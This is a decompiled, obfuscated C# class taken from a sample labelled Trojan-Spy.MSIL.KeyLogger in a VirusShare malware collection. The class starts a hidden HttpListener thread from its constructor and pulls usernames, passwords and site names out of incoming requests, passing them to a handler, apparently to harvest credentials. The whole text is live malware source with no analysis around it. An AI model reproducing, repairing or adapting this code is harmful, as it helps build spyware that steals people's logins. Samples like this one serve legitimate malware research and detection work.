// Decompiled with JetBrains decompiler
// Type: ᠆
// Assembly: dskl, Version=1.71.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5380AAD3-568D-45D6-B9BC-59CE5C1E3490
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.czk-cde7546df369e926f201a20ea21a174728391b0927412058c56dcdd5367e606c.exe

using System;
using System.Net;
using System.Threading;
using System.Web;

internal class \u1806
{
  private អ ᡉᙃ;
  private bool ᡊᙃ;
  private HttpListener ᡋᙃ;

  private void ᡈᙃ()
  {
    do
      ;
    while (false);
    this.ᡋᙃ = new HttpListener();
    try
    {
      \u1806.ᡆᙃ ᡆᙃ = new \u1806.ᡆᙃ(ᙀ.ᙬ.ᙞ);
      \u1806.ᡇᙃ ᡇᙃ = new \u1806.ᡇᙃ(ᙀ.ᙬ.ᙠ);
      this.ᡋᙃ.Prefixes.Add(ᙵ.ᙚᙃ);
      this.ᡋᙃ.Start();
      while (this.ᡋᙃ.IsListening && this.ᡊᙃ)
      {
        HttpListenerContext context = this.ᡋᙃ.GetContext();
        context.Response.Abort();
        Uri uri = new Uri(context.Request.Url.ToString());
        string query = uri.Query == "" ? uri.OriginalString : uri.Query;
        if (query.Contains(ᙵ.ᙙᙃ) && query.Contains(ᙵ.ᙞᙃ) && query.Contains(ᙵ.ᙠᙃ))
        {
          string un = HttpUtility.ParseQueryString(query).Get(ᙵ.ᙢᙃ);
          string pw = HttpUtility.ParseQueryString(query).Get(ᙵ.ᙤᙃ);
          string site = HttpUtility.ParseQueryString(query).Get(ᙵ.ᙦᙃ);
          if (!site.Equals(""))
            ᡇᙃ(un, pw, site);
        }
        else
        {
          string url = HttpUtility.ParseQueryString(query).Get(ᙵ.ᙨᙃ);
          if (!url.Equals(""))
            ᡆᙃ(ᙵ.ᙪᙃ, url);
        }
        context.Response.Close();
      }
      this.ᡋᙃ.Stop();
    }
    catch (HttpListenerException ex)
    {
    }
    catch (ThreadAbortException ex)
    {
    }
    catch (Exception ex)
    {
      this.ᡉᙃ.ឨ(ex);
    }
    this.ᡋᙃ.Close();
  }

  public void \u1808()
  {
    do
      ;
    while (false);
    try
    {
      this.ᡊᙃ = false;
      this.ᡋᙃ.Stop();
      this.ᡋᙃ.Abort();
      this.ᡋᙃ.Close();
    }
    catch (Exception ex)
    {
      this.ᡉᙃ.ឨ(ex);
    }
    int num1;
    int num2;
    while (num1 == num2)
    {
      num2 = 1;
      int num3 = num2;
      int num4 = num1;
      num1 = num3;
      if (num1 > num4)
        break;
    }
  }

  public \u1806()
  {
    do
      ;
    while (false);
    this.ᡉᙃ = new អ();
    this.ᡊᙃ = true;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    new Thread(new ThreadStart(this.ᡈᙃ)).Start();
  }

  private delegate void ᡆᙃ(string sender, string url);

  private delegate void ᡇᙃ(string un, string pw, string site);
}
